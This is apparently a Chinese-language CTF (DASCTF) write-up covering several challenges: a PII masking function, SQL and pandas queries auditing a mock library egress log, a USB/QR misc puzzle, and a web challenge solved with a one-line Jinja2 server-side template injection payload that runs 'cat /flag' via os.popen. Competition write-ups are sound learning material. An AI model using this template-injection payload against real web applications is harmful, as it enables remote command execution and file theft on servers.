# DS6-1 ShieldCall
关键 Python 代码逻辑如下
```python
    def _mask(kind, value):
        """部分遮蔽：保留首尾，保留长度特征。"""
        if kind in ("CN_MOBILE",):
            return value[:3] + "*" * (len(value) - 5) + value[-2:]
        if kind in ("CN_IDCARD", "CN_BANKCARD"):
            return  "*" * 6 + value[6:14] + "*" * 4
        if kind == "EMAIL":
            name, _, dom = value.partition("@")
            return (name[:2] + "***" if len(name) > 2 else "***") + "@" + dom
        if kind == "NAME":
            return value[0] + ("*" if len(value) <= 3 else "**") + (value[-1:] if len(value)!=2 else "")
 ```

<img width="865" height="546" alt="image" src="https://github.com/user-attachments/assets/6aaf4702-a21d-41b1-8410-28eecd5c0990" />

# DS6-2 LibRelay
使用 phpStudy 运行 WNMP，将 .sql 文件导入使用 phpmyadmin 进行查询导出为 .csv 文件进行拼接，第一个条件使用 Python+pandas 筛选
## TICKET_MISSING  票据编号在馆际票据接入归档中不存在
赛后记：一开始没想好这个怎么写先写后面的了，后来还读了半天本地的 PostgreSQL 的文档尝试找到能解决问题的 SQL 语句写法，最后这个实在不知道怎么用 SQL 写了，尝试在 Excel 里寻找公式解决问题好像也没有能用的，最后没招了写出来个 $O(n^2)$ 的狗屎 Python 脚本，But it works，csv 文件是用本地 phpStudy 里的 phpMyAdmin 导入 .sql 文件之后两个表分别导出的
```py
import pandas as pd
gateway_egress_log = pd.read_csv('gateway_egress_log_FULL.csv')
ticket_archive = pd.read_csv('ticket_archive_FULL.csv')
for i in range(len(gateway_egress_log['transfer_id'])):
    flag = False
    for j in range(len(ticket_archive['ticket_id'])):
        if(gateway_egress_log['ticket_id'][i]==ticket_archive['ticket_id'][j]):
            flag = True
            continue
    if flag == False:
        print(gateway_egress_log['transfer_id'][i])
```
## TICKET_REVOKED  票据状态不是已授权
```sql
SELECT * FROM gateway_egress_log
JOIN ticket_archive ON ticket_archive.ticket_id=gateway_egress_log.ticket_id
WHERE (`gateway_egress_log`.`field_code` = 'AR-MANUSCRIPT' OR gateway_egress_log.field_code = 'RB-CHAPTER') AND gateway_egress_log.status = 'COMPLETED' AND ticket_archive.ticket_status !='GRANTED'
```
## TICKET_MISMATCH  读者编号(reader_id)或资源字段(field_code)与票据不一致
```sql
SELECT * FROM gateway_egress_log
JOIN ticket_archive ON ticket_archive.ticket_id=gateway_egress_log.ticket_id
WHERE (`gateway_egress_log`.`field_code` = 'AR-MANUSCRIPT' OR gateway_egress_log.field_code = 'RB-CHAPTER') AND gateway_egress_log.status = 'COMPLETED' AND (gateway_egress_log.reader_id!=ticket_archive.reader_id OR gateway_egress_log.field_code!=ticket_archive.field_code)
```
## TICKET_NOT_YET  外发开始时刻早于票据签发时刻
```
SELECT * FROM gateway_egress_log
JOIN ticket_archive ON ticket_archive.ticket_id=gateway_egress_log.ticket_id
WHERE (`gateway_egress_log`.`field_code` = 'AR-MANUSCRIPT' OR gateway_egress_log.field_code = 'RB-CHAPTER') AND gateway_egress_log.status = 'COMPLETED' AND gateway_egress_log.started_at < ticket_archive.granted_at
```
## TICKET_EXPIRED  外发开始时刻晚于票据有效期结束时刻
```sql
SELECT * FROM gateway_egress_log
JOIN ticket_archive ON ticket_archive.ticket_id=gateway_egress_log.ticket_id
WHERE (`gateway_egress_log`.`field_code` = 'AR-MANUSCRIPT' OR gateway_egress_log.field_code = 'RB-CHAPTER') AND gateway_egress_log.status = 'COMPLETED' AND gateway_egress_log.started_at > ticket_archive.expires_at
```
## KEY_INACTIVE  外发开始时刻不在签名密钥激活窗口内 
```sql
SELECT * FROM gateway_egress_log
JOIN ticket_archive ON ticket_archive.ticket_id=gateway_egress_log.ticket_id
JOIN key_history ON key_history.kid=gateway_egress_log.sign_kid
WHERE (`gateway_egress_log`.`field_code` = 'AR-MANUSCRIPT' OR gateway_egress_log.field_code = 'RB-CHAPTER') AND gateway_egress_log.status = 'COMPLETED' AND (gateway_egress_log.started_at<=key_history.active_from OR gateway_egress_log.started_at>=key_history.active_to OR key_history.active_from>=key_history.active_to)
```
 
<img width="865" height="546" alt="image" src="https://github.com/user-attachments/assets/2f43f5fb-b2e7-48b6-b8a1-c12ad7983080" />

# Misc 5-1 键盘侠的 USB 日记
将a替换为0，b替换为1，删除所有换行符，使用PuzzleSolver转为二维码，使用PixPin截图识别二维码获得flag
  
`DASCTF{9a37252d-3e8e-4e79-a492-4b488b5c18ad}`

<img width="332" height="332" alt="image" src="https://github.com/user-attachments/assets/35b16ed6-bb76-429a-ac12-5297a20c693b" />

<img width="318" height="318" alt="image" src="https://github.com/user-attachments/assets/36d68bb9-0260-4218-b62c-560e30d36b13" />

# Web 1-1 pynote
使用个人离线知识库中的模板注入获得flag
 
`{{ config.__class__.__init__.__globals__['os'].popen('cat /flag').read() }}`

`DASCTF{27179590609503639600931470308181}`
 
<img width="865" height="546" alt="image" src="https://github.com/user-attachments/assets/75d54f94-f386-47af-9f19-177469ffc3ce" />
<img width="865" height="546" alt="image" src="https://github.com/user-attachments/assets/acac1236-5979-46dc-9620-2655c5275ee0" />